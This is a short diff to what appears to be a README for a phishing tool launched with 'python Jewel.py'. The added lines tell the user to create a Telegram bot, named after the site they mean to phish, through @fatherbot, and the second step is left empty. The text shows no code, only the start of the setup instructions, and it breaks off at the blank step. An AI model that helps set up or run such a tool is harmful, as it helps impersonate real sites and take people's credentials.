@@ -23,4 +23,6 @@ python Jewel.py
 ````
 # employment
 
-* 1- Create a bot in Telegram and name it after the site you want to phish.  
+* 1- Create a bot in Telegram and name it after the site you want to phish via @fatherbot.  
+
+* 2- 
